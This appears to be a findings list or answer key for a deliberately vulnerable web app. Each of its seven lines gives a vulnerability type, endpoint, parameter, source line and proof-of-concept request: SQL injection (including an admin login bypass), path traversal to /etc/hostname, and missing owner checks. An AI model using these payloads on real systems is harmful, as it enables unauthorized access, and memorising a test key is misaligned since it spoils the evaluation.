1. SQL injection | GET /api/products | q | victim/app/products.py:23 | `GET /api/products?q=zzzzzz' OR '1'='1` returns every product
2. SQL injection | POST /api/login | email | victim/app/auth.py:56 | `{"email":"admin@tienda.example' --","password":"x"}` logs in as admin
3. Path traversal | GET /api/files/download | name | victim/app/files.py:17 | `GET /api/files/download?name=../../../../../../etc/hostname`
4. Path traversal | GET /api/products/{id}/image | file | victim/app/files.py:27 | `GET /api/products/1/image?file=../../../../../../etc/hostname`
5. IDOR (missing owner check) | GET /api/orders/{order_id} | order_id | victim/app/orders.py:79 | `GET /api/orders/12` with any valid token
6. IDOR (missing owner check) | GET /api/orders/{order_id}/invoice | order_id | victim/app/orders.py:90 | `GET /api/orders/12/invoice` with any valid token
7. IDOR (missing owner check) | GET /api/users/{user_id}/profile | user_id | victim/app/users.py:11 | `GET /api/users/7/profile` with any valid token
